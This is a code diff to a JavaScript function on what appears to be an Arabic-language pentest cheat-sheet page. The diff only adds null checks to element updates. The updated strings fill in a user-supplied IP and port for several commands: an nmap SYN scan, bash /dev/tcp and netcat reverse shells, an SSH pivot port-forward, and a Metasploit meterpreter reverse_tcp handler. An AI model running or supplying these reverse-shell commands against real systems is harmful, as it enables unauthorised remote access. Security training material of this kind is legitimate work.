@@ -923,18 +923,18 @@ exploit -j</pre>
       const port = document.getElementById('rtfm-port').value.trim() || '4444';
       
       // Update commands
-      document.getElementById('cmd-rtfm-nmap').innerHTML = `nmap -sS -Pn -p- -T4 --open ${ip}`;
-      document.getElementById('cmd-rtfm-bash').innerHTML = `bash -i >& /dev/tcp/${ip}/${port} 0>&1`;
-      document.getElementById('cmd-rtfm-nc').innerHTML = `nc -e /bin/bash ${ip} ${port}`;
-      document.getElementById('cmd-rtfm-ssh').innerHTML = `# توجيه منفذ محلي عبر SSH\nssh -N -L 0.0.0.0:8080:${ip}:80 user@pivot_ip`;
-      document.getElementById('cmd-rtfm-msf').innerHTML = `use exploit/multi/handler\nset payload windows/meterpreter/reverse_tcp\nset LHOST ${ip}\nset LPORT ${port}\nexploit -j`;
+      (document.getElementById('cmd-rtfm-nmap') || {}).innerHTML = `nmap -sS -Pn -p- -T4 --open ${ip}`;
+      (document.getElementById('cmd-rtfm-bash') || {}).innerHTML = `bash -i >& /dev/tcp/${ip}/${port} 0>&1`;
+      (document.getElementById('cmd-rtfm-nc') || {}).innerHTML = `nc -e /bin/bash ${ip} ${port}`;
+      (document.getElementById('cmd-rtfm-ssh') || {}).innerHTML = `# توجيه منفذ محلي عبر SSH\nssh -N -L 0.0.0.0:8080:${ip}:80 user@pivot_ip`;
+      (document.getElementById('cmd-rtfm-msf') || {}).innerHTML = `use exploit/multi/handler\nset payload windows/meterpreter/reverse_tcp\nset LHOST ${ip}\nset LPORT ${port}\nexploit -j`;
       
       // Update table cells
-      document.getElementById('td-rtfm-nmap').innerHTML = `<code>nmap -sS -Pn -p- -T4 --open ${ip}</code>`;
-      document.getElementById('td-rtfm-bash').innerHTML = `<code>bash -i >& /dev/tcp/${ip}/${port} 0>&1</code>`;
+      (document.getElementById('td-rtfm-nmap') || {}).innerHTML = `<code>nmap -sS -Pn -p- -T4 --open ${ip}</code>`;
+      (document.getElementById('td-rtfm-bash') || {}).innerHTML = `<code>bash -i >& /dev/tcp/${ip}/${port} 0>&1</code>`;
 
       // Update simulator outputs
-      document.getElementById('sim-rtfm-nmap').innerHTML = `Starting Nmap 7.92 ( https://nmap.org ) at 2026-07-13 01:00\nNmap scan report for ${ip}\nHost is up (0.045s latency).\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n445/tcp  open  microsoft-ds\nScan completed in 12.5 seconds.`;
+      (document.getElementById('sim-rtfm-nmap') || {}).innerHTML = `Starting Nmap 7.92 ( https://nmap.org ) at 2026-07-13 01:00\nNmap scan report for ${ip}\nHost is up (0.045s latency).\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n445/tcp  open  microsoft-ds\nScan completed in 12.5 seconds.`;
     }
 
     function copyCode(btn) {
